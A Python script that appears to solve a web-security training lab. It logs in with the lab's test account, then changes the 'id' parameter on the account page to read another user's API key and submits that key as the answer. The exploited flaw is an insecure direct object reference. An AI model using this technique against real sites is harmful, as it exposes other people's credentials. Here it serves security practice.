#!/usr/bin/env python3
"""User ID controlled by request parameter"""

import requests

import lab_04

class Lab(lab_04.Lab):
    """Wrapper"""

    @staticmethod
    def get_api_key_from_response(response: requests.models.Response) -> str:
        """Parse response for API key"""
        for line in response.text.splitlines():
            if "Your API Key is: " in line:
                return line.split("Your API Key is: ")[1].split("<")[0]
        raise ValueError("Cannot find API key")


    def get_api_key_from_user_id(self, user_id: str) -> str:
        """Get a given user's API key"""
        response = self.get(self.url + "/my-account", params={"id": user_id})
        return self.get_api_key_from_response(response)

    def submit_solution(self, answer: str) -> requests.models.Response:
        """Submit solution"""
        payload = {"answer": answer}
        response = self.session.post(self.url + "/submitSolution", data=payload)
        response.raise_for_status()
        return response

def main() -> None:
    """Entry point"""
    site = Lab()
    csrf = site.csrf_token("/login")
    site.login(username="wiener", password="peter", csrf=csrf)
    api_key = site.get_api_key_from_user_id("carlos")
    response = site.submit_solution(api_key)
    print(response.status_code)

if __name__ == "__main__":
    main()
